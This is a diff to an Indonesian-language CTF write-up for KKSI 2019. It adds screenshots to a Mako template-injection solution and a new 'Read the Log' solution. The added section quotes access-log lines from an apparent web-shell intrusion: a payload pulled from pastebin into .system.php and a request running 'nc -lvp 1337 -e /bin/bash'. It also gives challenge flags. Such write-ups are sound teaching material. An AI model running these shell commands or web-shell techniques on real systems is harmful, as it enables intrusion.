@@ -38,7 +38,12 @@ Deskripsi :
 
 Solusi :
 Diberikan suatu file `main.py`, setelah kami analisa ternyata ini adalah file flask, maka kami mencoba melakukan SSTI. Setelah mencoba beberapa jenis SSTI, ditemukan payload yang bisa berjalan yaitu `${1+1}`. 
+
+![](https://raw.githubusercontent.com/kerupuksambel/ctf-writeup/master/KKSI_2019/Mako_Onii-chan/Mako%20-%201.png)
+
 Dengan bentuk payloadnya, kami mengetahui bahwa ini dibangun dengan framework Mako. Setelah mencari-cari jenis payload yang bisa digunakan, kami menyadari bahwa kita bisa melakukan import dengan mengganti parameter import menjadi ascii per karakternya dan di `chr()`.
+
+![enter image description here](https://raw.githubusercontent.com/kerupuksambel/ctf-writeup/master/KKSI_2019/Mako_Onii-chan/Mako%20-%202.png)
 
 Kami mencoba melakukan import subprocess untuk melakukan RCE dan ternyata bisa, dan akhirnya didapatkan flagnya.
 ```
@@ -54,4 +59,30 @@ data = {'name': grup}
 print(r.post(url, data=data).text)
 ```
 
+![enter image description here](https://raw.githubusercontent.com/kerupuksambel/ctf-writeup/master/KKSI_2019/Mako_Onii-chan/Mako%20-%203.png)
+
 Flag : **KKSI2019{64_32_16_8_4_2_0}**
+
+### Read the Log
+
+Deskripsi :
+>[Get Flag Here](http://202.148.2.243:30011/)
+>
+>[Read the Log](https://drive.google.com/file/d/1zujIwaWX3i9wcmCJX6nYT2o6xtwIWFOM)
+
+Solusi :
+Saat membaca `access.log` yang disediakan, kami menemukan sesuatu yang menarik.
+>https://pastebin.com/raw/zNg9JQ12 -O .system.php HTTP/1.1" 200 1070166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
+>
+>172.17.0.2 - - [21/Oct/2019:00:43:40 +0700] "GET /.system.php?f=system&p=id HTTP/1.1" 200 53 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
+>
+>172.17.0.2 - - [21/Oct/2019:00:45:00 +0700] "GET /.system.php?f=system&p=nc -lvp 1337 -e /bin/bash HTTP/1.1" 504 494 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
+
+Terlihat ada request ke `.system.php` yang mencurigakan dan memanggil perintah bash seperti nc dan id. Maka kami mencoba mengunjungi halaman tersebut dan ternyata kami bisa melakukan shell_exec disana.
+
+Setelah melakukan ls, kami mengetahui bahwa flagnya ada di `fl4g.txt` (Saat lomba, nama file aslinya adalah `flllllllaaaaaaaaaaaaaaaaaaaaaaaaaaa_g.txt` namun diganti saat penulisan writeup)
+
+Kami melakukan cat dan flagnya pun ditemukan.
+![enter image description here](https://raw.githubusercontent.com/kerupuksambel/ctf-writeup/master/KKSI_2019/Read_the_Log/Log%20-%201.png)
+Flag : **KKSI2019{Emang_Sabar_Adalah_Kuncinya}** 
+
